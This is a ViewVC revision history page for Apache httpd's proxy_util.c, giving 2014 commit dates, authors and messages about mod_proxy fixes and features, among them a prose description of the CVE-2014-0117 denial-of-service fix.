- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1648433)

Modified
*Mon Dec 29 21:05:56 2014 UTC*
(10 years ago)
by *covener*

File length: 129060 byte(s)

Diff to [previous 1647009](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1647009&r2=1648433)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1647009&r2=1648433&diff_format=h))
```
PR 56603:  Inappropiate ProxyPassReverse match when interpolated URL
is empty string

Submitted By: <ajprout hotmail.com>
Committed By: covener

```

---

Revision [**1647009**](/viewvc?view=revision&revision=1647009) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1647009&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1647009&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1647009))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1647009)

Modified
*Sat Dec 20 15:56:16 2014 UTC*
(10 years, 1 month ago)
by *covener*

File length: 129050 byte(s)

Diff to [previous 1644503](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1644503&r2=1647009)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1644503&r2=1647009&diff_format=h))
```
Allow SetHandler+UDS+fcgi to take advantage of dedicated workers including
opting in to connection reuse and other proxy options (max=, etc).

adds 'enablereuse' proxyoption and a minor MMN bump to share
proxy_desocketfy outside of mod_proxy.c, which is required to
match workers to URLs.

```

---

Revision [**1644503**](/viewvc?view=revision&revision=1644503) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1644503&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1644503&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1644503))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1644503)

Modified
*Wed Dec 10 18:45:24 2014 UTC*
(10 years, 1 month ago)
by *ylavic*

File length: 129217 byte(s)

Diff to [previous 1641636](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1641636&r2=1644503)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1641636&r2=1644503&diff_format=h))
```
mod_proxy: don't add the default port to the name of proxy workers. PR 57259.
ap_proxy_port_of_scheme() knows more default ports than apr_unparse_uri().

```

---

Revision [**1641636**](/viewvc?view=revision&revision=1641636) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1641636&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1641636&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1641636))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1641636)

Modified
*Tue Nov 25 15:38:10 2014 UTC*
(10 years, 2 months ago)
by *covener*

File length: 128534 byte(s)

Diff to [previous 1641381](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1641381&r2=1641636)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1641381&r2=1641636&diff_format=h))
```
elaborate on a TRACE2 message about using the default reverse
proxy worker.

```

---

Revision [**1641381**](/viewvc?view=revision&revision=1641381) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1641381&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1641381&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1641381))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1641381)

Modified
*Mon Nov 24 12:36:32 2014 UTC*
(10 years, 2 months ago)
by *covener*

File length: 128511 byte(s)

Diff to [previous 1634425](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1634425&r2=1641381)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1634425&r2=1641381&diff_format=h))
```
Return a match whenever we get to the end of the worker name, regardless
of whether there is URL left.

ProxyPassMatch had been using the default worker in trunk.

```

---

Revision [**1634425**](/viewvc?view=revision&revision=1634425) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1634425&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1634425&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1634425))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1634425)

Modified
*Mon Oct 27 00:55:20 2014 UTC*
(10 years, 3 months ago)
by *covener*

File length: 128452 byte(s)

Diff to [previous 1634120](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1634120&r2=1634425)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1634120&r2=1634425&diff_format=h))
```
When using EBCDIC encoding, HTTPS through ProxyPass and ProxyRemote doesn't
work correctly. PR 57092

Submitted By: Edward Lu
Committed By: covener

```

---

Revision [**1634120**](/viewvc?view=revision&revision=1634120) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1634120&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1634120&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1634120))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1634120)

Modified
*Fri Oct 24 19:00:10 2014 UTC*
(10 years, 3 months ago)
by *rpluem*

File length: 128333 byte(s)

Diff to [previous 1625952](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1625952&r2=1634120)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1625952&r2=1634120&diff_format=h))
```
* Use the correct server name for SNI in case the backend SSL connection itself
  is established via a proxy server.

PR: 57139
Submitted by: Szabolcs Gyurko <szabolcs gyurko.org>

```

---

Revision [**1625952**](/viewvc?view=revision&revision=1625952) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1625952&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1625952&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1625952))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1625952)

Modified
*Thu Sep 18 12:10:54 2014 UTC*
(10 years, 4 months ago)
by *jim*

File length: 128144 byte(s)

Diff to [previous 1621419](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1621419&r2=1625952)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1621419&r2=1625952&diff_format=h))
```
oops... prepend 0

```

---

Revision [**1621419**](/viewvc?view=revision&revision=1621419) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1621419&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1621419&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1621419))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1621419)

Modified
*Sat Aug 30 06:51:11 2014 UTC*
(10 years, 4 months ago)
by *jailletc36*

File length: 128143 byte(s)

Diff to [previous 1621372](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1621372&r2=1621419)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1621372&r2=1621419&diff_format=h))
```
Fix sscanf format spotted by cppcheck.
Improve alignment.
Untested.

```

---

Revision [**1621372**](/viewvc?view=revision&revision=1621372) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1621372&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1621372&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1621372))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1621372)

Modified
*Fri Aug 29 19:42:34 2014 UTC*
(10 years, 4 months ago)
by *jim*

File length: 128131 byte(s)

Diff to [previous 1621367](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1621367&r2=1621372)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1621367&r2=1621372&diff_format=h))
```
Correct loglevel.

```

---

Revision [**1621367**](/viewvc?view=revision&revision=1621367) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1621367&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1621367&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1621367))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1621367)

Modified
*Fri Aug 29 19:17:45 2014 UTC*
(10 years, 4 months ago)
by *jim*

File length: 128133 byte(s)

Diff to [previous 1619455](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1619455&r2=1621367)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1619455&r2=1621367&diff_format=h))
```
PR53218
Allow for longer worker names and make truncation a non-fatal
error...

```

---

Revision [**1619455**](/viewvc?view=revision&revision=1619455) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1619455&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1619455&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1619455))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1619455)

Modified
*Thu Aug 21 15:49:54 2014 UTC*
(10 years, 5 months ago)
by *ylavic*

File length: 128037 byte(s)

Diff to [previous 1610674](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1610674&r2=1619455)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1610674&r2=1619455&diff_format=h))
```
mod_proxy: add missing APLOGNOs.

```

---

Revision [**1610674**](/viewvc?view=revision&revision=1610674) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1610674&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1610674&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1610674))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1610674)

Modified
*Tue Jul 15 12:27:00 2014 UTC*
(10 years, 6 months ago)
by *jorton*

File length: 128027 byte(s)

Diff to [previous 1609680](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1609680&r2=1610674)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1609680&r2=1610674&diff_format=h))
```
SECURITY (CVE-2014-0117): Fix a crash in mod_proxy.  In a reverse
proxy configuration, a remote attacker could send a carefully crafted
request which could crash a server process, resulting in denial of
service.

Thanks to Marek Kroemeke working with HP's Zero Day Initiative for
reporting this issue.

* server/util.c (ap_parse_token_list_strict): New function.

* modules/proxy/proxy_util.c (find_conn_headers): Use it here.

* modules/proxy/mod_proxy_http.c (ap_proxy_http_process_response):
  Send a 400 for a malformed Connection header.

Submitted by: Edward Lu, breser, covener

```

---

Revision [**1609680**](/viewvc?view=revision&revision=1609680) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1609680&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1609680&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1609680))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1609680)

Modified
*Fri Jul 11 10:36:15 2014 UTC*
(10 years, 6 months ago)
by *jkaluza*

File length: 127949 byte(s)

Diff to [previous 1609101](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1609101&r2=1609680)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1609101&r2=1609680&diff_format=h))
```
mod_proxy: add ap_proxy_define_match_worker() and use it for ProxyPassMatch
and ProxyMatch section to distinguish between normal workers and workers
with regex substitutions in the name. Implement handling of such workers
in ap_proxy_get_worker(). PR 43513

```

---

Revision [**1609101**](/viewvc?view=revision&revision=1609101) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1609101&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1609101&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1609101))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1609101)

Modified
*Wed Jul 9 11:11:23 2014 UTC*
(10 years, 6 months ago)
by *ylavic*

File length: 125612 byte(s)

Diff to [previous 1602989](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1602989&r2=1609101)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1602989&r2=1609101&diff_format=h))
```
Fix C99 (or later only) comment.

```

---

Revision [**1602989**](/viewvc?view=revision&revision=1602989) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1602989&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1602989&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1602989))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1602989)

Modified
*Mon Jun 16 20:26:24 2014 UTC*
(10 years, 7 months ago)
by *ylavic*

File length: 125609 byte(s)

Diff to [previous 1602697](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1602697&r2=1602989)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1602697&r2=1602989&diff_format=h))
```
mod_proxy: Don't limit the size of the connectable Unix Domain Socket paths.
Since connect() to UDS path is used at several places, introduce
ap_proxy_connect_uds() in proxy_util.

```

---

Revision [**1602697**](/viewvc?view=revision&revision=1602697) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1602697&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1602697&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1602697))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1602697)

Modified
*Sun Jun 15 13:54:55 2014 UTC*
(10 years, 7 months ago)
by *jim*

File length: 125456 byte(s)

Diff to [previous 1602523](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1602523&r2=1602697)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1602523&r2=1602697&diff_format=h))
```
revert 1602523, until there is understanding
about what the actual issue and "requirement" are.

```

---

Revision [**1602523**](/viewvc?view=revision&revision=1602523) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1602523&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1602523&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1602523))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1602523)

Modified
*Fri Jun 13 21:10:51 2014 UTC*
(10 years, 7 months ago)
by *jim*

File length: 125581 byte(s)

Diff to [previous 1601630](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1601630&r2=1602523)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1601630&r2=1602523&diff_format=h))
```
Allow for "magic" scheme "auto" which makes the scheme of
the backend worker match whatever the scheme of the
incoming request was...

For example:

   ProxyPass / auto://foo.example.com/

If the incoming request is http:.../lala then
the resultant will be <http://foo.example.com/lala>

If it's wws:.../lolo then we'd send
wws://foo.example.com/lolo

```

---

Revision [**1601630**](/viewvc?view=revision&revision=1601630) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1601630&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1601630&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1601630))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1601630)

Modified
*Tue Jun 10 13:23:20 2014 UTC*
(10 years, 7 months ago)
by *ylavic*

File length: 125456 byte(s)

Diff to [previous 1601291](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1601291&r2=1601630)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1601291&r2=1601630&diff_format=h))
```
mod_proxy: follow up to [r1601291](/viewvc?view=revision&revision=1601291).

Since deferred_write_pool is needed by the core_output_filter and is a subpool
of the connection, shutdown in a pre_cleanup of the connection's pool to avoid
a freed memory access (SEGV).

Reported By: takashi

```

---

Revision [**1601291**](/viewvc?view=revision&revision=1601291) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1601291&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1601291&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1601291))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1601291)

Modified
*Mon Jun 9 01:03:39 2014 UTC*
(10 years, 7 months ago)
by *ylavic*

File length: 125505 byte(s)

Diff to [previous 1601290](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1601290&r2=1601291)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1601290&r2=1601291&diff_format=h))
```
mod_proxy: Shutdown (eg. SSL close notify) the backend connection
before closing.

```

---

Revision [**1601290**](/viewvc?view=revision&revision=1601290) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1601290&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1601290&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1601290))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1601290)

Modified
*Mon Jun 9 00:59:04 2014 UTC*
(10 years, 7 months ago)
by *ylavic*

File length: 124509 byte(s)

Diff to [previous 1601285](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1601285&r2=1601290)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1601285&r2=1601290&diff_format=h))
```
Revert [r1601285](/viewvc?view=revision&revision=1601285) and [r1601283](/viewvc?view=revision&revision=1601283).
Shouldn't have commited the latter without disussing it on dev@.
Since the former creates upper APLOGNOs, revert and then recommit with the reverted next tag number.

```

---

Revision [**1601285**](/viewvc?view=revision&revision=1601285) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1601285&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1601285&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1601285))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1601285)

Modified
*Mon Jun 9 00:23:16 2014 UTC*
(10 years, 7 months ago)
by *ylavic*

File length: 125505 byte(s)

Diff to [previous 1592615](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1592615&r2=1601285)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1592615&r2=1601285&diff_format=h))
```
mod_proxy: Shutdown (eg. close notify) the backend connection before closing.

```

---

Revision [**1592615**](/viewvc?view=revision&revision=1592615) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1592615&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1592615&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1592615))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1592615)

Modified
*Mon May 5 19:26:33 2014 UTC*
(10 years, 8 months ago)
by *trawick*

File length: 124509 byte(s)

Diff to [previous 1592529](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1592529&r2=1592615)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1592529&r2=1592615&diff_format=h))
```
Follow-up to [r1592529](/viewvc?view=revision&revision=1592529):

Define default port for "scgi" schemes (as chosen by
mod_proxy_scgi) in a common location.

Suggested by: jailletc36

```

---

Revision [**1592529**](/viewvc?view=revision&revision=1592529) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1592529&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1592529&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1592529))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1592529)

Modified
*Mon May 5 14:02:48 2014 UTC*
(10 years, 8 months ago)
by *trawick*

File length: 124482 byte(s)

Diff to [previous 1592514](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1592514&r2=1592529)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1592514&r2=1592529&diff_format=h))
```
mod_proxy_scgi: Support Unix sockets.

ap_proxy_port_of_scheme(): Support default SCGI port (4000).

```

---

Revision [**1592514**](/viewvc?view=revision&revision=1592514) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1592514&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1592514&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1592514))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1592514)

Modified
*Mon May 5 12:47:18 2014 UTC*
(10 years, 8 months ago)
by *trawick*

File length: 124458 byte(s)

Diff to [previous 1592511](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1592511&r2=1592514)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1592511&r2=1592514&diff_format=h))
```
Clarify an existing requirement of the server_portstr parameter
to ap_proxy_determine_connection(): it must be a buffer of at
least one byte in size.

(And don't bother with using strcpy in order to zap a string.)

```

---

Revision [**1592511**](/viewvc?view=revision&revision=1592511) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1592511&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1592511&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1592511))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1592511)

Modified
*Mon May 5 12:40:47 2014 UTC*
(10 years, 8 months ago)
by *trawick*

File length: 124413 byte(s)

Diff to [previous 1588544](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1588544&r2=1592511)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1588544&r2=1592511&diff_format=h))
```
reformat only (get rid of unnecessary block scope)

```

---

Revision [**1588544**](/viewvc?view=revision&revision=1588544) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1588544&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1588544&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1588544))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1588544)

Modified
*Fri Apr 18 19:21:35 2014 UTC*
(10 years, 9 months ago)
by *jim*

File length: 124456 byte(s)

Diff to [previous 1588527](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1588527&r2=1588544)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1588527&r2=1588544&diff_format=h))
```
strncmp(r->filename, "proxy:", 6) is faster than a
note. Plus, allows for checking even if not due to
rewrite.

```

---

Revision [**1588527**](/viewvc?view=revision&revision=1588527) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1588527&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1588527&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1588527))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1588527)

Modified
*Fri Apr 18 17:38:15 2014 UTC*
(10 years, 9 months ago)
by *ylavic*

File length: 124625 byte(s)

Diff to [previous 1588519](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1588519&r2=1588527)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1588519&r2=1588527&diff_format=h))
```
mod_proxy: Preserve original request headers even if they differ
           from the ones to be forwarded to the backend. PR 45387.

```

---

Revision [**1588519**](/viewvc?view=revision&revision=1588519) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1588519&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1588519&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1588519))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1588519)

Modified
*Fri Apr 18 17:17:06 2014 UTC*
(10 years, 9 months ago)
by *ylavic*

File length: 124338 byte(s)

Diff to [previous 1573229](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1573229&r2=1588519)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1573229&r2=1588519&diff_format=h))
```
mod_proxy: When ping/pong is configured for a worker, don't send or forward
           "100 Continue" (interim) response to the client if it does not
           expect one.

```

---

Revision [**1573229**](/viewvc?view=revision&revision=1573229) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1573229&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1573229&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1573229))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1573229)

Modified
*Sat Mar 1 21:36:27 2014 UTC*
(10 years, 10 months ago)
by *ylavic*

File length: 123761 byte(s)

Diff to [previous 1572967](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1572967&r2=1573229)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1572967&r2=1573229&diff_format=h))
```
mod_proxy: Add comment and avoid ternary operator as condition (no functional change).

```

---

Revision [**1572967**](/viewvc?view=revision&revision=1572967) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1572967&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1572967&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1572967))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1572967)

Modified
*Fri Feb 28 14:46:50 2014 UTC*
(10 years, 10 months ago)
by *ylavic*

File length: 123584 byte(s)

Diff to [previous 1572630](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1572630&r2=1572967)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1572630&r2=1572967&diff_format=h))
```
mod_proxy: follows up [r1572630](/viewvc?view=revision&revision=1572630).
Don't reuse a SSL backend connection with no SNI for a request requiring SNI.

```

---

Revision [**1572630**](/viewvc?view=revision&revision=1572630) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1572630&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1572630&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1572630))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1572630)

Modified
*Thu Feb 27 15:40:01 2014 UTC*
(10 years, 11 months ago)
by *ylavic*

File length: 123514 byte(s)

Diff to [previous 1572627](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1572627&r2=1572630)
